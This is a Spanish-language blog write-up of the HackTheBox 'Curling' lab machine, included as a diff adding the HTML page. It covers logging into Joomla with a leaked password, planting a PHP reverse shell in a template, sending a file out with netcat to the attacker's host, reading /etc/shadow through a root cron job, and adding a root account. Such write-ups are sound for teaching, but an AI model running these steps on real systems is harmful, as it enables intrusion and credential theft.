@@ -1,0 +1,241 @@
+      <!DOCTYPE html>
+  <html lang="es">
+    <head>
+      <meta charset="utf-8" />
+      <meta http-equiv="X-UA-Compatible" content="IE=endge, chrome=IE8" />
+      <meta name="viewport" content="initial-scale=1.0, width=device-width, user-scalable=no" />
+      <meta name="keywords" content="cft,hackthebox,writeup,curling" />
+      <meta name="description" content="Apuntes y notas de un newbie." />
+      <meta name="author" content="root" />
+      
+        <title> [Writeup] HackTheBox: Curling
+ - [ root@paranoia ~/blog ]# _</title>
+     
+      <!--[if lte IE 8]><script type="text/javascript" src="/theme/js/html5shiv.js"></script><![endif]-->
+      <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
+      <link rel="stylesheet" type="text/css" href="css/theme.css" />
+      <link rel="stylesheet" type="text/css" href="css/pygment.css" />
+      <link rel="shortcut icon" type="image/png" href="/favicon.png" />
+      <!--[if lte IE 8]><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" /><![endif]-->
+    </head>
+    <body>
+        <div class="container">
+        <header id="menu">
+            <nav>
+                <ul>
+                    <li><a href="index.html">inicio</a></li>
+                    <li><a target="_blank" href="https://github.com/aljavier">github</a></li>
+                    <li><a href="enlaces.html">enlaces</a></li>
+                    <li><a href="about.html">acerca</a></li>
+                </ul>
+                <h4>[ root@paranoia ~/blog ]# _</h4>
+            </nav>
+        </header>
+         
+         
+         <article>
+                <header class="post-header">
+                    <div class="meta"><time datetime="2019-12-10 00:00:00">diciembre 10, 2019</time></div>
+                <h1>
+                     [Writeup] HackTheBox: Curling
+
+                </h1>
+                </header>
+                <div class="post-content"> 
+                    <h1>[Writeup] HackTheBox: Curling</h1>
+<p><img alt="Info" src="images/htb/curling/info.png" /></p>
+<p>Disclaimer: My first box ever.</p>
+<p>Primero podemos hacer una simple enumeración de la máquina para ver los servicios corriendo allí y similares.</p>
+<p>Con Nmap en mi caso fue como sigue</p>
+<div class="codehilite"><pre><span></span><span class="err">nmap -sV -sC -oA curling 10.10.10.150</span>
+</pre></div>
+
+
+<p><img alt="nmap" src="images/htb/curling/nmap.png" /></p>
+<p>Vemos que tenemos un servidor ssh coriendo en la maquina y un servidor Apache con un sitio web que usa Joomla. Intenté hacer fuerza bruta al servidor ssh y fracasé miserablemente. </p>
+<p>No obstante, podemos echarle un ojo al sitio web y hacer el típico "Click derecho &gt; Ver código fuente" ya que es algo usual en este tipo de retos que haya una pista allí. En el código fuente casi al final del sitio antes del <code>&lt;/html&gt;</code> podemos ver una pista como se muestra abajo.</p>
+<div class="codehilite"><pre><span></span><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+      <span class="c">&lt;!-- secret.txt --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>Probamos en el navegador web yendo a <code>10.10.10.150/secret.txt</code>, en mi caso. Efectivamente, el archivo existe y contiene lo que parece ser una texto codificado en base64, ¿Será una contraseña?</p>
+<div class="codehilite"><pre><span></span>wget <span class="m">10</span>.10.10.150/secret.txt
+cat secret.txt
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span><span class="err">Q3VybGluZzIwMTgh</span>
+</pre></div>
+
+
+<p>Probamos decodificarlo a ver que dice</p>
+<div class="codehilite"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;Q3VybGluZzIwMTgh&quot;</span> <span class="p">|</span> base64 -d
+</pre></div>
+
+
+<div class="codehilite"><pre><span></span><span class="err">Curling2018!</span>
+</pre></div>
+
+
+<p>Nos arroja el resultado arriba lo que sí parece ser una contraseña.</p>
+<p>De vuelta a la raíz del sitio web podemos ver en algunos lados palabras como "pebble", "curling2018!" y el usuario "Floris". Como ya sabemos que el sitio web usa Joomla por los resultados de Nmap y otras cosas (como el icono del sitio web) nos vamos al panel de administración en <code>http://10.10.10.150/administrator/</code>.</p>
+<p>Luego de probar con el usuario "Floris" y la contraseña arriba y fracasar probamos con el mismo usuario pero todo en minúsculas y la misma contraseña y ya estamos dentro!</p>
+<p><img alt="panel Joomla" src="images/htb/curling/panel_joomla.png" /></p>
+<div class="codehilite"><pre><span></span><span class="n">Usuario</span><span class="o">:</span> <span class="n">floris</span>
+<span class="n">Contrase</span><span class="err">ñ</span><span class="n">a</span><span class="o">:</span> <span class="n">Curling2018</span><span class="o">!</span>
+</pre></div>
+
+
+<p><img alt="Ya en Joomla" src="images/htb/curling/logueado.png" /></p>
+<p>Ya estamos dentro de Joomla, ahora hay que idear una manera para obtener una shell. Para este caso lo haremos de la siguiente manera:</p>
+<ol>
+<li>Ir a Extensions &gt; Templates &gt; Templates</li>
+<li>Le damos click a un template cualquiera</li>
+<li>Seleccionamos un archivo como <code>error.php</code></li>
+</ol>
+<p><img alt="Editar template" src="images/htb/curling/subir_shell.png" /></p>
+<ol>
+<li>Reemplazamos todo el contenido de ese archivo con el contenido de esta shell en php <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a>. Es una buena idea revisar </li>
+<li>Es una buena idea revisar el código de la shell. Para nuestro caso debemos modificar la variable <code>$ip</code> en ese archivo y poner el valor de nuestra IP local en la red, podemos dejar <code>%port</code> tal cual esta. Presionamos <code>Save</code>, por supuesto.</li>
+</ol>
+<div class="codehilite"><pre><span></span><span class="x">$ip = &#39;10.10.13.129&#39;;  // CHANGE THIS</span>
+<span class="x">$port = 1234;       // CHANGE THIS</span>
+</pre></div>
+
+
+<ol>
+<li>Ahora ponemos en nuestra máquina ncat a escuchar en el puerto <code>1234</code></li>
+</ol>
+<div class="codehilite"><pre><span></span>nc -vlp <span class="m">1234</span>
+</pre></div>
+
+
+<ol>
+<li>Vamos al directorio de templates de Joomla hacia el template y archivo que modificamos directamente en el navegador</li>
+</ol>
+<div class="codehilite"><pre><span></span><span class="c">http://10.10.10.150/templates/beez3/error.php</span>
+</pre></div>
+
+
+<p>Y nos vamos a nuestra terminal donde esta ncat corriendo en el puerto <code>1234</code>.</p>
+<p><img alt="Tenemos shell" src="images/htb/curling/got_shell.png" /></p>
+<p>Perfecto, ya tenemos una reverse shell!</p>
+<p><em>Nota: Resolver el problema de tty que dice arriba con <code>/usr/bin/python3.6m -c 'import pty; pty.spawn("/bin/bash")'</code></em>.</p>
+<p>Veamos que podemos obtener sin ser root. </p>
+<p><img alt="Primeros datos" src="images/htb/curling/init_0.png" /></p>
+<p>Ese archivo <code>password_backup</code> aunque dice ser archivo regular más bien parece ocultar algo. El archivo comienza con el texto <code>BZh91AY&amp;SY</code>, el cual es un encabezado de los archivos <code>bzip2</code> si no me equivoco. </p>
+<p>Ahora vamos a pasar el archivo a nuestra maquina para inspeccionarlo  con <code>binwalk</code> a ver que encontramos</p>
+<p>Atacante:</p>
+<div class="codehilite"><pre><span></span><span class="err">nc -lvp 7777 &gt; password_backup</span>
+</pre></div>
+
+
+<p>Victima:</p>
+<p>```
+ nc 10.10.13.129 7777 &lt; password_backup</p>
+<div class="codehilite"><pre><span></span><span class="err">!</span><span class="o">[</span><span class="n">binwalk</span><span class="o">]</span><span class="p">(</span><span class="n">images</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">curling</span><span class="o">/</span><span class="n">binwalk</span><span class="p">.</span><span class="n">png</span><span class="p">)</span><span class="w"></span>
+
+<span class="n">Oh</span><span class="p">,</span><span class="w"> </span><span class="n">es</span><span class="w"> </span><span class="n">un</span><span class="w"> </span><span class="n">archivo</span><span class="w"> </span><span class="n">comprimido</span><span class="w"> </span><span class="n">bzip2</span><span class="p">.</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">descomprimirlo</span><span class="err">!</span><span class="w"></span>
+
+<span class="err">```</span><span class="n">bash</span><span class="w"></span>
+<span class="n">xxd</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">password_backup</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">backup</span><span class="w"></span>
+<span class="n">bzip2</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="k">backup</span><span class="w"></span>
+<span class="n">mv</span><span class="w"> </span><span class="k">backup</span><span class="p">.</span><span class="k">out</span><span class="w"> </span><span class="k">backup</span><span class="p">.</span><span class="n">gz</span><span class="w"></span>
+<span class="n">gunzip</span><span class="w"> </span><span class="k">backup</span><span class="p">.</span><span class="n">gz</span><span class="w"></span>
+<span class="n">tar</span><span class="w"> </span><span class="n">xvf</span><span class="w"> </span><span class="k">backup</span><span class="w"></span>
+</pre></div>
+
+
+<p>El último comando, el <code>tar xvf</code>, da como resultado el archivo</p>
+<div class="codehilite"><pre><span></span><span class="err">password.txt</span>
+</pre></div>
+
+
+<p><img alt="Password" src="images/htb/curling/password.png" /></p>
+<p>Ok, ahora probemos en la shell con usuario floris y esa password tal cual.</p>
+<p><img alt="Hash User" src="images/htb/curling/user.png" /></p>
+<p>user.txt</p>
+<div class="codehilite"><pre><span></span><span class="err">82c198ab6fc5365fdc6da2ee5c26064a</span>
+</pre></div>
+
+
+<p>Bien! Ahora a buscar la forma de hacernos root!</p>
+<p><img alt="admin-area" src="images/htb/curling/input_wut.png" /></p>
+<p>Parecería como que usando <code>cURL</code> cada cierto tiempo (~x segundos) acceden a la <code>URL</code> en el archivo "input" y con el resultado llenan el archivo "report".</p>
+<p>Probemos. Sobreescrimos el archivo <code>/home/floris/admin-area/input</code> como se muestra debajo</p>
+<div class="codehilite"><pre><span></span><span class="err">echo &quot;url = file:///127.0.0.1/../../../root/root.txt&quot; &gt; input</span>
+</pre></div>
+
+
+<p>Monitoreamos hasta que sea leído por lo que sea que este leyendo el archivo y escribiendo a "report". Luego que notemos haya sido modificado el hash de root debería estar en el archivo "report".</p>
+<p><img alt="root hash" src="images/htb/curling/root_hash.png" /></p>
+<p>root.txt</p>
+<div class="codehilite"><pre><span></span><span class="err">82c198ab6fc5365fdc6da2ee5c26064a</span>
+</pre></div>
+
+
+<h2>Obteniendo accesos como root</h2>
+<p>Hace un tiempo largo que trabajé en esta máquina antes de terminar el writeup, así que me faltan apuntes e imágenes y demás. Pero para obtener acceso como root, ya que la flag de root para los puntos en HackTheBox la obtuve como mostré antes, obtuve el archivo <code>/etc/passwd</code> y el <code>/etc/shadow</code> usando la misma técnica que usé para obtener la flag de root.txt. </p>
+<p>Para el <code>passwd</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">url = file:///etc/passwd</span>
+</pre></div>
+
+
+<p>Para el <code>shadow</code>:</p>
+<div class="codehilite"><pre><span></span><span class="err">url = file:///etc/passwd</span>
+</pre></div>
+
+
+<p>Envié ambos archivos a mi máquina atacante para poder modificarlo más cómodo y así agregar un usuario con permisos de root, al cual llamé <code>domi</code>. Utilizé la técnica descrita en <a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Manually Editing User inside /etc/passwd File</a>, (la sección del mismo nombre que el link aquí). Es básicamente, sólo agregar el usuario al <code>passwd</code> duplicando la linea de <code>root</code> y cambiando el nombre, luego generar una password con el cifrado correcto usando <code>OpenSSL</code>.</p>
+<p><img alt="root" src="images/htb/curling/root.png" /></p>
+<p>Para terminar muestro el job de crontab que tomaba el archivo <code>input</code> y generaba el <code>report</code>, en la imágen siguiente.</p>
+<p><img alt="cron job" src="images/htb/curling/cron_job.png" /></p>
+                    
+                     
+                     <div class="plain-text-link">
+                          &laquo;<a href="htb-curling-writeup.txt" title="Ver en texto plano">txt</a>&raquo;
+                     </div>
+                    
+                </div>
+              
+                <hr/>
+                <!-- discus comments go here -->
+                 <div id="disqus_thread"></div>
+                <script type="text/javascript">
+                    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                    var disqus_shortname = 'sysflux'; // required: replace example with your forum shortname
+                    /* * * DON'T EDIT BELOW THIS LINE * * */
+                    (function() {
+                        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                        dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+                        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                    })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                <a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+          </article>
+    
+       
+        <footer id="page-foot">
+            <p>
+                Contenido bajo licencia <a href="https://creativecommons.org/licenses/by-sa/4.0/legalcode"> CC BY-SA</a> 
+                | Powered by <a href="https://www.python.org/">Python</a> &copy;
+            </p>
+        </footer>
+        </div>
+        <!-- Google Analytics here -->
+        <script type="text/javascript">
+        var _gaq = _gaq || [];
+            _gaq.push(['_setAccount', 'UA-45917501-1']);
+            _gaq.push(['_trackPageview']);
+        (function() {
+          var ga = document.createElement('script'); 
+          ga.type = 'text/javascript'; ga.async = true;
+          ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+        })();
+      </script>
+    </body>
+    </html>
